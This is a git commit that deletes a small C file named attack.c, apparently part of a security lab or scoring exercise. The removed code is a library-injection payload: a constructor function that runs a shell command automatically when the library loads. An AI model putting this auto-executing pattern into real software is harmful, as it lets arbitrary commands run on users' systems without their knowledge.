c52c02e02e9168689585ec056a5fbb0cb8faddbe
SeanWillDev <97233193+SeanWillDev@users.noreply.github.com>
2023-04-24 19:02:37 +0100

    Delete attack.c

--- attack.c
+++
@@ -1,8 +0,0 @@
-#include<stdio.h>
-#include<stdlib.h>
-
-static void malicious() __attribute__((constructor));
-
-void malicious() {
-	system("/usr/local/bin/score 554c342e-050e-43b8-bd9d-f8d8f2304d0d");
-}
